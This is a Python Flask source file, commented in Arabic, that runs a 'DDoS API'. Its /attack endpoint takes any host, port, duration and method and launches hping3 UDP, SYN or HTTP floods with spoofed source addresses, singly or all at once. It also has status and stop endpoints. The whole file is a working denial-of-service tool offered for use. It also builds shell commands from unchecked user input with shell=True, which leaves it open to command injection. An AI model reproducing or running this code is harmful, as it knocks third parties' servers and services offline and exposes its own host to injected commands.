#!/usr/bin/env python3
"""
API قوي للهجوم - يدعم UDP Flood، TCP SYN Flood، HTTP Flood
"""

from flask import Flask, request, jsonify
import threading
import time
import subprocess
import os

app = Flask(__name__)

# تخزين الهجمات النشطة
active_attacks = {}

# ========== هجوم UDP Flood قوي باستخدام hping3 ==========
def udp_flood_hping3(target_ip, target_port, duration):
    """هجوم UDP باستخدام hping3 - قوي جداً"""
    cmd = f"hping3 --flood --udp --rand-source -p {target_port} {target_ip} -d 1400"
    process = subprocess.Popen(cmd, shell=True)
    time.sleep(duration)
    process.terminate()

# ========== هجوم TCP SYN Flood (يخنق السيرفر) ==========
def syn_flood_hping3(target_ip, target_port, duration):
    """هجوم TCP SYN Flood - يخنق السيرفر بالاتصالات الوهمية"""
    cmd = f"hping3 --flood --syn --rand-source -p {target_port} {target_ip}"
    process = subprocess.Popen(cmd, shell=True)
    time.sleep(duration)
    process.terminate()

# ========== هجوم HTTP Flood (طبقة التطبيقات) ==========
def http_flood(target_ip, target_port, duration):
    """هجوم HTTP - يستنزف موارد الهدف"""
    cmd = f"hping3 --flood --http --rand-source -p {target_port} {target_ip}"
    process = subprocess.Popen(cmd, shell=True)
    time.sleep(duration)
    process.terminate()

# ========== هجوم شامل (كل الطرق معاً) ==========
def all_flood(target_ip, target_port, duration):
    """جميع الهجمات معاً - الأقوى"""
    attacks = [
        threading.Thread(target=udp_flood_hping3, args=(target_ip, target_port, duration)),
        threading.Thread(target=syn_flood_hping3, args=(target_ip, target_port, duration)),
        threading.Thread(target=http_flood, args=(target_ip, target_port, duration))
    ]
    for attack in attacks:
        attack.start()
    for attack in attacks:
        attack.join()

# ========== دوال API ==========
@app.route('/')
def home():
    return jsonify({
        "name": "DDoS API",
        "version": "3.0",
        "methods": ["UDP", "SYN", "HTTP", "ALL"],
        "endpoints": ["/attack", "/status", "/stop"]
    })

@app.route('/attack')
def attack():
    """بدء هجوم - مثال: /attack?host=1.1.1.1&port=80&time=60&method=UDP"""
    host = request.args.get('host')
    port = request.args.get('port')
    duration = request.args.get('time')
    method = request.args.get('method', 'UDP').upper()
    
    if not host or not port or not duration:
        return jsonify({"error": "المعلمات المطلوبة: host, port, time"}), 400
    
    try:
        port = int(port)
        duration = int(duration)
        if duration > 180:
            duration = 180
    except:
        return jsonify({"error": "port و time يجب أن تكون أرقاماً"}), 400
    
    attack_id = f"{host}:{port}:{int(time.time())}"
    
    active_attacks[attack_id] = {
        "host": host,
        "port": port,
        "method": method,
        "end": time.time() + duration
    }
    
    # اختيار الهجوم حسب الطريقة
    if method == "UDP":
        thread = threading.Thread(target=udp_flood_hping3, args=(host, port, duration))
    elif method == "SYN":
        thread = threading.Thread(target=syn_flood_hping3, args=(host, port, duration))
    elif method == "HTTP":
        thread = threading.Thread(target=http_flood, args=(host, port, duration))
    else:
        thread = threading.Thread(target=all_flood, args=(host, port, duration))
    
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "status": "started",
        "attack_id": attack_id,
        "host": host,
        "port": port,
        "duration": duration,
        "method": method
    })

@app.route('/status')
def status():
    """جلب حالة الهجمات النشطة"""
    attacks_list = []
    for aid, data in list(active_attacks.items()):
        remaining = int(data['end'] - time.time())
        if remaining > 0:
            attacks_list.append({
                "id": aid,
                "host": data['host'],
                "port": data['port'],
                "method": data['method'],
                "remaining": remaining
            })
    
    return jsonify({
        "active_count": len(attacks_list),
        "attacks": attacks_list
    })

@app.route('/stop')
def stop():
    """إيقاف جميع الهجمات"""
    for aid in list(active_attacks.keys()):
        del active_attacks[aid]
    
    # إيقاف عمليات hping3
    subprocess.run("pkill -f hping3", shell=True)
    
    return jsonify({"status": "stopped", "message": "تم إيقاف جميع الهجمات"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
